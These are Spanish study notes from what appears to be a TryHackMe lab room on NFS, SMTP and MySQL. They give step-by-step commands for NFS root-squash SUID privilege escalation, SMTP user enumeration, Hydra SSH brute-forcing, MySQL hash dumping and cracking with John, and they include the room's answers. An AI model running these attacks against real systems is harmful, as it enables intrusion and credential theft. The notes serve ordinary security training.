1) ENTENDIENDO NFS

    NFS significa "Network File System" y permite que un sistema comparta directorios y archivos con otros a través de una red. 
    Al utilizar NFS, los usuarios y los programas pueden acceder a archivos en sistemas remotos casi como si fueran archivos locales. 
    Para ello, monta todo o una parte de un sistema de archivos en un servidor. Los clientes pueden acceder a la parte del sistema de archivos que 
    está montada con los privilegios asignados a cada archivo.

    ¿COMO FUNCIONA?

        No necesitamos comprender el intercambio técnico con demasiados detalles para poder explotar NFS de manera efectiva; sin embargo, si esto es 
        algo que le interesa, le recomendaría este recurso: https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html

        Primero, el cliente solicitará montar un directorio desde un host remoto en un directorio local de la misma manera que puede montar un 
        dispositivo físico. El servicio de montaje actuará para conectarse al demonio de montaje relevante mediante RPC.

        El servidor comprueba si el usuario tiene permiso para montar el directorio solicitado. A continuación, devolverá un identificador de archivo 
        que identifica de forma única cada archivo y directorio que se encuentra en el servidor.

        Si alguien quiere acceder a un archivo usando NFS, se coloca una llamada RPC a NFSD (el demonio NFS) en el servidor. Esta llamada toma parámetros como:

                El identificador de archivo
                El nombre del archivo al que se accede
                El usuario, ID de usuario
                El ID de grupo del usuario

        Se utilizan para determinar los derechos de acceso al archivo especificado. Esto es lo que controla los permisos de usuario, la lectura y escritura 
        de archivos de IE.

    ¿QUE FUNCIONA CON NFS?

        Con el protocolo NFS, puede transferir archivos entre computadoras que ejecutan Windows y otros sistemas operativos que no son Windows, como Linux
        MacOS o UNIX.

        Una computadora que ejecuta Windows Server puede actuar como un servidor de archivos NFS para otras computadoras cliente que no son de Windows. 
        Del mismo modo, NFS permite que una computadora basada en Windows que ejecuta Windows Server acceda a archivos almacenados en un servidor NFS que 
        no sea de Windows.

        Aquí hay algunos recursos que explican la implementación técnica y el funcionamiento de NFS con más detalle de lo que he cubierto aquí.

            https://www.datto.com/library/what-is-nfs-file-share

            http://nfs.sourceforge.net/

            https://wiki.archlinux.org/index.php/NFS

        Protocolo que utiliza NFS == RPC

2) ENUMERACIÓN NFS

    REQUISITOS:

        Para hacer una enumeración más avanzada del servidor NFS y los recursos compartidos, necesitaremos algunas herramientas. El primero de los cuales es 
        clave para interactuar con cualquier recurso compartido NFS desde su máquina local: nfs-common.

    NFS-Common

        Es importante  tener este paquete instalado en cualquier máquina que use NFS, ya sea como  cliente o como  servidor. Incluye programas como:  
        l ockd, statd , showmount , nfsstat,  gssd ,  idmapd y mount.nfs . Principalmente, nos preocupamos por "showmount" y  "mount.nfs", ya que nos 
        serán más útiles cuando se trata de  extraer información del recurso compartido NFS. Si desea obtener más  información sobre este paquete, no dude 
        en leer: https://packages.ubuntu.com/xenial/nfs-common .

    ESCANEO DE PUERTOS:

        Ya visto

    MONTAJE DE RECURSOS COMPARTIDOS:

        El sistema de su cliente necesita un directorio donde se pueda acceder a todo el contenido compartido por el servidor host en la carpeta de exportación.
        Podemos crear esta carpeta en cualquier lugar de nuestro sistema. Una ved que allamos creado este punto de montaje, podemos usar el comando:

            mount 

        Para conectar el recurso compartido NFS al punto de montaje en nuestra máquina de la siguiente manera:

            sudo mount -t nfs ip:share /tmp/mount/ -nolock

                mount == Comando de montaje
                -t nfs == Tipo de dispositivo a montar, luego especificando que es NFS
                -nolock == Especifica no utilizar bloqueo NLM.

    Procedimientos a su escaneo:

        @@ Despues de hacer un nmap y localizar el puerto NFS listaremos los recursos compartidos de nuestra victima:

            /usr/sbin/showmount -e IP == Lista los recursos compartidos NFS

        @@ Ahora montamos el recurso compartido en nuestra máquina local:

            mkdir /home/mobius/escritorio == Para crear un directorio en el que mostrar el recurso compartido.

        @@ Despues usamos el comando de montaje para montar el recurso compartido:

            sudo mount -t nfs ip:carpeta_de_ip_victima /tmp/mount/ -nolock == Deveremos estar dentro de nuestra carpeta 

        @@ Una ved dentro buscamos toda la informacion relevante del usuario.

3) EXPLOTACIÓN NFS

    HEMOS TERMINADO ¿ VERDAD?

        No del todo, si tiene un shell de privilegios bajos en cualquier máquina y descubrió que una máquina tiene 
        un recurso compartido NFS, es posible que pueda usarlo para escalar privilegios, dependiendo de cómo esté configurado.

    QUE ES ROOT_SQUASH:

        De forma predeterminada, en los recursos compartidos de NFS: el aplastamiento de raíz está habilitado y evita que cualquier 
        persona que se conecte al recurso compartido de NFS tenga acceso de root al volumen de NFS. A los usuarios raíz remotos se les asigna un 
        usuario "nfsnobody" cuando están conectados, que tiene los privilegios locales mínimos. No es lo que queremos. Sin embargo, si está desactivado, 
        puede permitir la creación de archivos de bits SUID, lo que permite que un usuario remoto acceda a la raíz del sistema conectado.

    SUID 

        Esto significa que el archivo o los archivos se pueden ejecutar con los permisos del propietario / grupo de archivos. En este caso como 
        super usuario. Podemos aprovechar esto para obtener un shell con estos privilegios.

    METODO:

        Podemos cargar archivos en el recurso compartido de NFS y controlar los permisos de estos archivos. Podemos establecer los permisos de 
        cualquier cosa que carguemos, en este caso un ejecutable de shell bash. Luego podemos iniciar sesion a través de SSh, como hicimos en la tarea anterior.
        Y ejecutar este ejecutable para obtener un shell de root.

    EL EJECUTABLE:

        Por razones de compatibilidad, usaremos un ejecutable bash estándar de Ubuntu server 18.04, el mismo que el del servidor. como savemos por nuestro escaneo 
        de nmap.

    CAMINO MAPEADO:

            Acceso NFS ->

                Ganar caparazón de privilegio bajo ->

                    Cargue Bash Executable en el recurso compartido de NFS ->

                        Establecer permisos SUID a través de NFS debido a una raíz squash mal configurada ->

                            Iniciar sesión a través de SSH ->

                                Ejecutar SUID Bit Bash ejecutable ->

                                    ACCESO RAÍZ

    ejemplo:

        @@ Primero, cambie el directorio al punto de montaje en su máquina, donde el recurso compartido NFS aún debería estar montado, y luego 
        al directorio de inicio del usuario.

        @@ Descargue el ejecutable de bash en su directorio de Descargas. Luego use "cp ~ / Downloads / bash". para copiar el ejecutable bash 
        al recurso compartido NFS. El shell bash copiado debe ser propiedad de un usuario root, puede configurarlo usando "sudo chown root bash"

        @@ Ahora, vamos a agregar el permiso de bit SUID al ejecutable bash que acabamos de copiar al recurso compartido usando "sudo chmod + [permiso] bash". 
        ¿Qué letra usamos para establecer el conjunto de bits SUID usando chmod?

        @@ Hagamos una verificación de cordura, verifiquemos los permisos del ejecutable "bash" usando "ls -la bash". ¿Qué aspecto tiene el conjunto de permisos? 
        Asegúrese de que termine con -sr-x.

        @@ Ahora, SSH en la máquina como usuario. Enumere el directorio para asegurarse de que el ejecutable de bash esté allí. Ahora, el momento de la verdad. 
        Ejecútelo con " ./bash -p ". El -p conserva los permisos, de modo que pueda ejecutarse como root con SUID, ya que de lo contrario, bash a veces eliminará 
        los permisos.

        @@ ¡Estupendo! Si todo ha ido bien, ¡deberías tener un caparazón como root! ¿Cuál es la bandera raíz?

4) ENTENDIENDO SMTP

    "Protocolo simple de transferencia de correo". Se utiliza para gestionar el envío de correos electrónicos. Para admitir los servicios de correo electrónico, se
    requiere un par de protocolos, que comprende SMTP y POP/IMAP. Juntos permiten al usuario enviar correo saliente y recuperar correo entrante, respectivamente.

    El servidor SMTP realiza tres funciones básicas:

        Verifica quién envía correos electrónicos a través del servidor SMTP.
        Envía el correo saliente.
        Si el correo saliente no se puede entregar, envía el mensaje al remitente.

    La mayoría de las personas se habrán encontrado con SMTP al configurar una nueva dirección de correo electrónico en algunos clientes de correo electrónico de 
    terceros, como Thunderbird; como cuando configura un nuevo cliente de correo electrónico, deberá configurar la configuración del servidor SMTP para poder enviar 
    correos electrónicos salientes.

        POP E IMAP:

            POP = Protocolo de oficina postal
            IMAP = Protocolo de acceso a mensajes de internet 

            Ambos protocolos de correo electrónico que son responsables de la transferencia de correo electrónico entre un cliente y un servidor de correo.

            Las principales diferencias están en el enfoque más simplista de POP de descargar la bandeja de entrada del servidor de correo al cliente.

            Donde IMAP sincronizará la bandeja de entrada actual, con el correo nuevo en el servidor, descargando cualquier cosa nueva. Esto significa
            que los cambios en la bandeja de entrada realizados en una computadora, a través de IMAP, persistirán si luego sincroniza la bandeja de entrada
            desde otra computadora. El servidor POP / IMAP es responsable de realizar este proceso.

        COMO FUNCIONA SMTP:

            La entrega de correo electrónico funciona de manera muy similar al sistema de entrega de correo físico. El usuario proporcionará el correo electrónico 
            (una carta) y un servicio (el servicio de entrega postal), y mediante una serie de pasos, lo entregará en la bandeja de entrada de los destinatarios 
            (buzón de correos). La función del servidor SMTP en este servicio es actuar como oficina de clasificación, el correo electrónico (carta) 
            se recoge y se envía a este servidor, que luego lo dirige al destinatario.

            1. El agente de usuario de correo, que es su cliente de correo electrónico o un programa externo. se conecta al servidor SMTP de su dominio, 
            por ejemplo, smtp.google.com. Esto inicia el protocolo de enlace SMTP. Esta conexión funciona a través del puerto SMTP, que suele ser el 25. 
            Una vez que se han realizado y validado estas conexiones, se inicia la sesión SMTP.

            2. Ahora puede comenzar el proceso de envío de correo. El cliente primero envía el remitente y la dirección de correo electrónico del destinatario, 
            el cuerpo del correo electrónico y los archivos adjuntos, al servidor.

            3. A continuación, el servidor SMTP comprueba si el nombre de dominio del destinatario y el del remitente es el mismo.

            4. El servidor SMTP del remitente se conectará al servidor SMTP del destinatario antes de retransmitir el correo electrónico. 
            Si no se puede acceder al servidor del destinatario, o no está disponible, el correo electrónico se coloca en una cola SMTP.

            5. Luego, el servidor SMTP del destinatario verificará el correo electrónico entrante. Para ello, comprueba si se han reconocido 
            el dominio y el nombre de usuario. Luego, el servidor reenviará el correo electrónico al servidor POP o IMAP, como se muestra en el diagrama anterior.

            6. El correo electrónico aparecerá en la bandeja de entrada del destinatario.

            Esta es una versión muy simplificada del proceso y hay muchos subprotocolos, comunicaciones y detalles que no se han incluido. 
            Si está buscando obtener más información sobre este tema, este es un desglose realmente fácil de leer de los detalles técnicos más finos; de hecho, 
            lo usé para escribir este desglose:

        PUERTO:

            25

5) ENUMERACIÓN SMTP

    ENUMERACIÓN DE LOS DETALLES DEL SERVIDOR:

        Los servidores de correo mal configurados o vulnerables a menudo pueden proporcionar un punto de apoyo inicial en una red, pero antes de lanzar un ataque, 
        queremos hacer una huella digital en el servidor para que nuestra orientación sea lo más precisa posible. Usaremos la " smtp_version.

    ENUMERACIÓN DE LOS USUARIOS DESDE SMTP:

        El servicio SMTP tiene dos comandos internos que permiten la enumeración de usuarios: VRFY (que confirma los nombres de los usuarios válidos) y EXPN 
        (que revela la dirección real de los alias de los usuarios y las listas de correo electrónico (listas de correo).

        Podemos hacer esto manualmente, a través de una conexión telnet; sin embargo, Metasploit viene al rescate nuevamente, proporcionando un módulo útil llamado 
        apropiadamente " smtp_enum. Usar el módulo es una simple cuestión de alimentarlo con un host o un rango de hosts para escanear y una 
        lista de palabras que contenga  nombres de usuario. enumerar.

    Alternativas

            Vale la pena señalar que esta técnica de enumeración funcionará para la mayoría de configuraciones SMTP; sin embargo, existen otras herramientas que no son metasploit, como smtp-user-enum, que funcionan incluso mejor para enumerar cuentas de usuario de nivel de sistema operativo en Solaris a través del servicio SMTP. La enumeración se realiza inspeccionando las respuestas a los comandos VRFY, EXPN y RCPT TO.

            Esta técnica podría adaptarse en el futuro para trabajar contra otros demonios SMTP vulnerables, pero esto no se ha hecho al momento de escribir este artículo. Es una alternativa que vale la pena tener en cuenta si está intentando

            Ahora hemos cubierto la teoría. ¡Vámonos!

                Ejemplos:

                    @ Primero ejecutamos un nmap como siempre e identificamos los puertos y servicios.

                    @ Bien, ahora que sabemos a qué puerto deberíamos apuntar, comencemos Metasploit. ¿Qué comando usamos para hacer esto?

                    Si desea obtener más ayuda o practicar el uso de Metasploit, Darkstar tiene una habitación increíble en Metasploit que puede consultar aquí:

                    https://tryhackme.com/room/rpmetasploit

                        msfconsole

                    @ Busquemos el módulo " smtp_version", ¿cuál es el nombre completo del módulo?

                        search smtp_version 

                    @ Genial, ahora, seleccione el módulo y enumere las opciones. Cómo hacemos esto?

                        show options

                    @ Eche un vistazo a las opciones, ¿todo parece correcto? ¿Cuál es la opción que debemos configurar?

                        RHOSTS

                    @ set RHOSTS ip
                      set THREADS 32
                      run

                    @ Ajústelo al valor correcto para su máquina de destino. Luego ejecuta el exploit. ¿Cuál es el nombre del correo del sistema?

                        polosmtp.home

                    @ ¿Qué agente de transferencia de correo (MTA) está ejecutando el servidor SMTP? Esto requerirá alguna investigación externa.

                        Postfix

                    @ ¡Bien! Ahora tenemos una buena cantidad de información sobre el sistema de destino para pasar a la siguiente etapa. Busquemos el módulo " smtp_enum ", 
                    ¿cuál es el nombre completo del módulo?


                            uxiliary/scanner/smtp/smtp_enum

                    @ Vamos a utilizar la lista de palabras "top-usernames-shortlist.txt" de la subsección Usernames de seclists (/ usr / share / wordlists / SecLists / Usernames si lo tiene instalado).

                    Seclists es una colección asombrosa de listas de palabras. Si está ejecutando Kali o Parrot, puede instalar seclists con: "sudo apt install seclists" Alternativamente, puede descargar el repositorio desde  aquí .

                    ¿Qué opción debemos establecer en la ruta de la lista de palabras?

                        USER_FILE

                    @ Despues:

                        RHOSTS

6) EXPLOTACION SMTP 

    ¿QUE SABEMOS?

        Bien, al final de nuestra sección de Enumeración tenemos algunos datos vitales:

            1. Un nombre de cuenta de usuario

            2. El tipo de servidor SMTP y sistema operativo en ejecución.

    Sabemos por nuestro escaneo de puertos, que el único otro puerto abierto en esta máquina es un inicio de sesión SSH. Usaremos esta 
    información para intentar forzar la contraseña del inicio de sesión SSH para nuestro usuario que usa Hydra.

    PREPARACIÓN:

        Es aconsejable que salga de Metasploit para continuar con la explotación de esta sección de la sala. En segundo lugar, es útil anotar la información que 
        recopiló durante la etapa de enumeración para ayudar en la explotación.

    HYDRA:

        Existe una amplia gama de personalización cuando se trata de usar Hydra, y permite ataques de contraseña adaptables contra muchos servicios diferentes, 
        incluido SSH. Hydra viene por defecto tanto en Parrot como en Kali, sin embargo, si lo necesita, puede encontrar GitHub aquí .

        Hydra usa principalmente ataques de diccionario, tanto Kali Linux como Parrot OS tienen muchas listas de palabras diferentes en el 
        directorio " / usr / share / wordlists ", si desea navegar y encontrar listas de palabras diferentes al ampliamente utilizado "rockyou.txt". Del mismo modo, 
        recomiendo consultar SecLists para obtener una gama más amplia de otras listas de palabras que son extremadamente útiles para todo tipo de propósitos, además 
        del descifrado de contraseñas. Por ejemplo, enumeración de subdominios
        
        La sintaxis del comando que usaremos para encontrar las contraseñas es la siguiente:

            hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.56.180 ssh

                -T16 == Conexiones paralelas por objetivo
                -l   == Usuario
                -P   == Ruta diccionario
                ssh  == Protocolo donde hacer el ataque

7) ENUMERAR SQL

    CUANDO COMENZAMOS A ATACAR MySQL

        Es probable que MySQL no sea el primer punto de llamada cuando se trata de obtener información inicial sobre el servidor. Puede, como hemos hecho en tareas 
        anteriores, intentar utilizar la fuerza bruta de las contraseñas de cuenta predeterminadas si realmente no tiene otra información; sin embargo, 
        en la mayoría de los escenarios CTF, es poco probable que esta sea la vía que debe seguir.

    ESCENARIO 

        Por lo general, habrá obtenido algunas credenciales iniciales al enumerar otros servicios, que luego podrá usar para enumerar y explotar el servicio MySQL. 
        Como esta sala se enfoca en explotar y enumerar el servicio de red, por el bien del escenario, asumiremos que encontró las credenciales: "root: contraseña" 
        mientras enumeraba los subdominios de un servidor web. Después de intentar el inicio de sesión con SSH sin éxito, decide intentarlo con MySQL.

    REQUISITOS

        Querrá tener MySQL instalado en su sistema para poder conectarse al servidor MySQL remoto. En caso de que aún no esté instalado, puede instalarlo 
        usando sudo apt install default-mysql-client. No se preocupe, esto no instalará el paquete del servidor en su sistema, solo el cliente.

        Nuevamente, usaremos Metasploit para esto, es importante que tenga instalado Metasploit, ya que está por defecto tanto en Kali Linux como en Parrot OS.

    ALTERNATIVAS 

        Al igual que con la tarea anterior, vale la pena señalar que todo lo que vamos a hacer con Metasploit también se puede hacer manualmente o con un conjunto 
        de herramientas que no son metasploit, como el script mysql-enum de nmap : https: // nmap. org / nsedoc / scripts / mysql-enum.html o 
        https://www.exploit-db.com/exploits/23081 . Le recomiendo que después de completar esta sala, vuelva atrás e intente hacerlo manualmente para 
        asegurarse de que comprende el proceso que se está utilizando para mostrar la información que adquiere.

        De acuerdo, suficiente charla. ¡Vámonos!
            
            @ Como siempre, comencemos con un escaneo de puertos, para que sepamos en qué puerto se está ejecutando el servicio que estamos tratando de atacar. 
            ¿Qué puerto está usando MySQL?:

                3306

            @ Bien, ahora creemos que tenemos un conjunto de credenciales. Comprobemos eso conectándonos manualmente al servidor MySQL. Podemos hacer esto usando 
            el comando " mysql -h [IP] -u [nombre de usuario] -p ":

            @ Bien, sabemos que nuestras credenciales de inicio de sesión funcionan. Salgamos de esta sesión con "salir" y lancemos Metasploit.

            @ Vamos a utilizar el módulo "mysql_sql".

            Busque, seleccione y enumere las opciones que necesita. ¿Qué tres opciones necesitamos establecer? (en orden descendente).


                    PASSWORD/RHOSTS/USERNAME

            @ Ejecute el exploit. De forma predeterminada, se probará con el comando "seleccionar versión ()", ¿qué resultado te da esto?

                5.7.29-0ubuntu0.18.04.1

            @ ¡Estupendo! Sabemos que nuestra hazaña está aterrizando según lo planeado. Intentemos obtener información más ambiciosa. Cambie la opción "sql" 
            a "show databases". ¿cuántas bases de datos se devuelven?

8) EXPLOTACIÓN MYSQL:

    ¿QUE SABEMOS?:

        Hagamos una verificación de cordura antes de continuar para intentar explotar la base de datos por completo y obtener información más confidencial que 
        solo los nombres de la base de datos. Sabemos:

            1. Credenciales del servidor MySQL

            2. La versión de MySQL en ejecución

            3. El número de bases de datos y sus nombres.

    TECNOLOGIA clave

        Para comprender los exploits que usaremos a continuación, debemos comprender algunos términos clave.

    SCHEMA:

        En MySQL, físicamente, un esquema es sinónimo de una base de datos . Puede sustituir la palabra clave "SCHEMA" en lugar de DATABASE en la sintaxis SQL de 
        MySQL, por ejemplo, utilizando CREATE SCHEMA 
        en lugar de CREATE DATABASE. Es importante comprender esta relación porque algunos otros productos de bases de datos hacen una distinción. Por ejemplo, 
        en el producto Oracle Database, un esquema representa solo una parte de una base de datos: las tablas y otros objetos propiedad de un solo usuario.

    HASHES:

        Los hash son, muy simplemente, el producto de un algoritmo criptográfico para convertir una entrada de longitud variable en una salida de longitud fija.

        En MySQL, los hashes se pueden usar de diferentes formas, por ejemplo, para indexar datos en una tabla hash. Cada hash tiene una identificación única que 
        sirve 
        como puntero a los datos originales. Esto crea un índice que es significativamente más pequeño que los datos originales, lo que permite buscar los valores y 
        acceder a ellos de manera más eficiente.

        Sin embargo, los datos que vamos a extraer son hash de contraseñas que son simplemente una forma de almacenar contraseñas que no están en formato de 
        texto sin formato.

        Vamos manos a la obra.

        EJEMPLOS:

            Primero, busquemos y seleccionemos el módulo "mysql_schemadump". ¿Cuál es el nombre completo del módulo? (en Metasploit)

                auxiliary/scanner/mysql/mysql_schemadump

            ¡Estupendo! Ahora, ya ha hecho esto varias veces, así que dejaré que lo tome desde aquí. Configure las opciones relevantes, 
            ejecute el exploit. ¿Cuál es el nombre de la última mesa que se tira?

                x$waits_global_by_latency

            Genial, ahora ha descargado las tablas y los nombres de las columnas de toda la base de datos. Pero podemos hacer algo mejor ... busque y seleccione el 
            módulo "mysql_hashdump". ¿Cuál es el nombre  completo del módulo?

                auxiliary/scanner/mysql/mysql_hashdump 

            Nuevamente, dejaré que lo tomes desde aquí. Configure las opciones relevantes, ejecute el exploit. ¿Qué usuario no predeterminado le llama la atención?

                carl 

            ¡Otro usuario! Y tenemos su hash de contraseña. Esto podria ser muy interesante. Copie la cadena hash en su totalidad, como: bob: * HASH a un archivo 
            de texto en su máquina local llamado "hash.txt".

            ¡Ahora, necesitamos descifrar la contraseña! Probemos a John the Ripper contra él usando: " john hash.txt " ¿cuál es la contraseña del usuario 
            que encontramos?

                john --show john-hash.txt

                doggie

            Impresionante. La reutilización de contraseñas no solo es extremadamente peligrosa, sino también extremadamente común. ¿Cuáles son las posibilidades 
            de que este usuario haya reutilizado su contraseña para un servicio diferente?

            Leer

                Aquí hay algunas cosas que pueden ser útiles para leer después de completar esta sala, si le interesa:

                https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-exploits.html
                https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
                Gracias

                Gracias por tomarse el tiempo de trabajar en esta sala, les deseo la mejor de las suertes en el futuro.

                ~ Polo



